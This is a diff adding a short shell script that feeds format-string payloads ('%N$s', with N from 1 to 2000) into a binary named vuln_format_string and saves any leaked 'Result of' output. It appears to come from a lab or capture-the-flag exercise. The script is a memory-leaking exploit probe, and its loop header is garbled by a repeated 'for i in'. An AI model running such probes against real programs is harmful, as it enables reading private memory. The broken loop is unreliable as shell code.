@@ -1,0 +1,9 @@
+#!/bin/sh
+
+
+
+for i in for i in $(seq 1 2000)
+do
+   echo "%${i}\$s" | ./vuln_format_string | grep "Result of" | strings >> results
+   
+done
